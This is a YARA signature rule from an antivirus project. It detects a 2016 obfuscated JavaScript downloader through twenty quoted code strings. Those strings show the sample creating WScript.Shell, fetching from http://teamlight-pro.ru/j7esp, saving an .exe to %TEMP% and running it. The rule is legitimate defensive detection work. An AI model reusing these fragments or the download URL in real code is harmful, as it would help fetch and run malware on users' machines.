rule sig_20160401_dbeab59a5cb01e4ed7105dc3c8fb5de6 {
  meta:
    description = "datamaliciousorder - file 20160401_dbeab59a5cb01e4ed7105dc3c8fb5de6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e3dafdd60dbec4407760c7f614bc0fd459f0b580010219140b8b8d9ba9bd4a0"

  strings:
    $s1  = "function MadMl(JwtJy, RlkKxv){DzWr = DzWr * 1; return JwtJy - RlkKxv;};" fullword ascii
    $s2  = "var LbdAd = function ZzMju() {return WScript[MvIi](\"WScript\"+\".Shell\");}(), GvOdc = 11;" fullword ascii
    $s3  = "if (AjhZm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "AjhZm[HaMek](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function IgxIig(){return TckQgr + \"\";};" fullword ascii
    $s6  = "function VxJuv() {return LbdAd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mQWHxzXfV.ex\" + \"e\";};" fullword ascii
    $s7  = "function BtDtj() {return ((NyPpt == true) && (NyPpt == FbXis)) ? 1 : DzWr;};" fullword ascii
    $s8  = "function BlPgp(MntRk) {var AkaQak = (1, 2, 3, 4, 5, MntRk); return AkaQak;};" fullword ascii
    $s9  = "var ImAvj = false;" fullword ascii
    $s10 = "function HuVoc(){return 23;};" fullword ascii
    $s11 = "FbXis = true; " fullword ascii
    $s12 = "function PoAfv()" fullword ascii
    $s13 = "var IdySr = new this[\"Date\"]();" fullword ascii
    $s14 = "var FbXis = false;" fullword ascii
    $s15 = "var NyPpt = false;" fullword ascii
    $s16 = "NyPpt = true; " fullword ascii
    $s17 = "return MadMl(PgwVg, IfoWgd);" fullword ascii
    $s18 = "function EmmOv(PcpGou){LbdAd[\"R\"+\"un\"](PcpGou, DzWr, DzWr);};" fullword ascii
    $s19 = "function KsPgh(){return MvIi;};" fullword ascii
    $s20 = "}while (CaWd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}